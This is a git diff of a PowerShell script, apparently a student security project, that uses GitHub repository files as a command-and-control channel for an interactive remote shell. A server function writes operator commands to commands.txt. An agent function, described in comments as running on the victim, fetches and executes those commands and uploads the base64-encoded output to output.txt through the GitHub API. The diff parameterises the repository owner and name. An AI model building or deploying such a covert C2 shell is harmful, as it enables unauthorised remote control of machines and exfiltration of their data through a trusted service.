@@ -11,9 +11,15 @@ Powershell script the uses Github website as an interactive shell infrastructure
 .PARAMTER token
 The user token from GitHub web site
 
+.PARAMTER User
+The user name on GitHub site
+
+.PARAMTER Repo
+The user repository on GitHub
+
 .EXAMPLE
 PS C:\> . .\github-intractive.ps1
-PS C:\> StartServer -token <Your Personal Token> 
+PS C:\> StartServer -token <Your Personal Token>  -User <user> -Repo <repository>
 
 .LINK
 https://channel9.msdn.com/Blogs/trevor-powershell/Automating-the-GitHub-REST-API-Using-PowerShell
@@ -31,16 +37,23 @@ Student ID: PSP-3225
 
        [Parameter(Mandatory = $true)]
        [String]
-       $token
+       $token,
+	   
+	   [Parameter(Mandatory = $true)]
+       [String]
+       $User,
+	   
+	   [Parameter(Mandatory = $true)]
+       [String]
+       $Repo
 
     )
-	
-	# Enabling TLS 
-	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-		
+
 	# For loop to continually take input from user and send it to victim
 	while ($true){
 		
+		# Enabling TLS 
+		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 		
 		# Reading use input
 		$command = read-host 'Enter command'
@@ -49,7 +62,7 @@ Student ID: PSP-3225
 		$fileToWrite = "commands.txt"
 		
 		# Getting the sha value of the file
-		$fileShaResponse = Invoke-RestMethod -Headers $auth -Method GET  -Uri "https://api.github.com/repos/cheappencil/PSSEScripts/contents/commands.txt" -ErrorAction SilentlyContinue
+		$fileShaResponse = Invoke-RestMethod -Headers $auth -Method GET  -Uri "https://api.github.com/repos/$User/$Repo/contents/commands.txt" -ErrorAction SilentlyContinue
 		
 		# File sha value
 		$fileSha = $fileShaResponse.sha
@@ -66,13 +79,13 @@ Student ID: PSP-3225
 		
 		# invoking the rest method request
 		try {
-			$response = Invoke-RestMethod -Headers $auth -Method PUT -Body $jsonData -Uri "https://api.github.com/repos/cheappencil/PSSEScripts/contents/commands.txt" -ErrorAction SilentlyContinue
+			$response = Invoke-RestMethod -Headers $auth -Method PUT -Body $jsonData -Uri "https://api.github.com/repos/$User/$Repo/contents/commands.txt" -ErrorAction SilentlyContinue
 			$fResponse = $response | select -ExpandProperty Content
 			$fileSha = $fResponse.sha
 		}
 		# If any error, re-invoke the rest method
 		catch {
-			$response = Invoke-RestMethod -Headers $auth -Method PUT -Body $jsonData -Uri "https://api.github.com/repos/cheappencil/PSSEScripts/contents/commands.txt" -ErrorAction SilentlyContinue
+			$response = Invoke-RestMethod -Headers $auth -Method PUT -Body $jsonData -Uri "https://api.github.com/repos/$User/$Repo/contents/commands.txt" -ErrorAction SilentlyContinue
 			$fResponse = $response | select -ExpandProperty Content
 			$fileSha = $fResponse.sha
 		}
@@ -82,7 +95,7 @@ Student ID: PSP-3225
 		Start-Sleep -s 3
 		
 		# invoke the rest request to the output file then decode the value returned
-		$getDataResponse =  Invoke-RestMethod -Headers $auth -Method GET  -Uri "https://api.github.com/repos/cheappencil/PSSEScripts/contents/output.txt" -ErrorAction SilentlyContinue
+		$getDataResponse =  Invoke-RestMethod -Headers $auth -Method GET  -Uri "https://api.github.com/repos/$User/$Repo/contents/output.txt" -ErrorAction SilentlyContinue
 		
 		# Base64 decode the output and print it
 		$b64Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(($getDataResponse | select -ExpandProperty Content)))
@@ -108,9 +121,15 @@ Powershell script the uses Github website as an interactive shell infrastructure
 .PARAMTER token
 The user token from GitHub web site
 
+.PARAMTER User
+The user name on GitHub site
+
+.PARAMTER Repo
+The user repository on GitHub
+
 .EXAMPLE
 PS C:\> . .\github-intractive.ps1
-PS C:\> StartAgent -token <Your Personal Token> 
+PS C:\> StartAgent -token <Your Personal Token>  -User <user> -Repo <repository>
 
 .LINK
 https://channel9.msdn.com/Blogs/trevor-powershell/Automating-the-GitHub-REST-API-Using-PowerShell
@@ -128,7 +147,15 @@ Student ID: PSP-3225
 
        [Parameter(Mandatory = $true)]
        [String]
-       $token
+       $token,
+	   
+	   [Parameter(Mandatory = $true)]
+       [String]
+       $User,
+	   
+	   [Parameter(Mandatory = $true)]
+       [String]
+       $Repo
 
     )
 	
@@ -142,11 +169,11 @@ Student ID: PSP-3225
 		$auth = @{"Authorization"="token $token"}
 		
 		# Saving the file sha value
-		$fileShaResponse = Invoke-RestMethod -Headers $auth -Method GET  -Uri "https://api.github.com/repos/cheappencil/PSSEScripts/contents/output.txt" -ErrorAction SilentlyContinue
+		$fileShaResponse = Invoke-RestMethod -Headers $auth -Method GET  -Uri "https://api.github.com/repos/$User/$Repo/contents/output.txt" -ErrorAction SilentlyContinue
 		$fileSha = $fileShaResponse.sha
 		
 		# Taking user commands to execute on victim
-		$getDataResponse =  Invoke-RestMethod -Headers $auth -Method GET  -Uri "https://api.github.com/repos/cheappencil/PSSEScripts/contents/commands.txt" -ErrorAction SilentlyContinue
+		$getDataResponse =  Invoke-RestMethod -Headers $auth -Method GET  -Uri "https://api.github.com/repos/$User/$Repo/contents/commands.txt" -ErrorAction SilentlyContinue
 		
 		# If response returned
 		if ($getDataResponse){
@@ -168,7 +195,7 @@ Student ID: PSP-3225
 			
 			# Invoke the rest method to upload the result of executed command
 			try {
-				$response = Invoke-RestMethod -Headers $auth -Method PUT -Body $jsonData -Uri  "https://api.github.com/repos/cheappencil/PSSEScripts/contents/output.txt" -ErrorAction SilentlyContinue
+				$response = Invoke-RestMethod -Headers $auth -Method PUT -Body $jsonData -Uri  "https://api.github.com/repos/$User/$Repo/contents/output.txt" -ErrorAction SilentlyContinue
 				if ($response){
 					write-host "[+] Executed commands successfully !" -ForeGroundColor Green
 				}
@@ -179,7 +206,7 @@ Student ID: PSP-3225
 			
 			# Re-invoke the rest method to upload the result of executed command
 			catch {
-				$response = Invoke-RestMethod -Headers $auth -Method PUT -Body $jsonData -Uri  "https://api.github.com/repos/cheappencil/PSSEScripts/contents/output.txt" -ErrorAction SilentlyContinue
+				$response = Invoke-RestMethod -Headers $auth -Method PUT -Body $jsonData -Uri  "https://api.github.com/repos/$User/$Repo/contents/output.txt" -ErrorAction SilentlyContinue
 				if ($response){
 					write-host "[+] Executed commands successfully !" -ForeGroundColor Green
 				}
